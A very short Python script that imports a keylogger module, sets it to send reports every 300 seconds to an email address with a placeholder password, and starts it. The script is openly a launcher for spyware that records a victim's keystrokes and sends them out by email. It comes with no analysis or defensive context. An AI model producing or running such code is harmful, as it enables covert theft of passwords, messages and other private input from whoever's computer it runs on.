#!/usr/bin/env python
import key_logger

# enter number of seconds between reports
my_keylogger = key_logger.Keylogger(300, "johnroge@outlook.com", "somepassword")
my_keylogger.start()
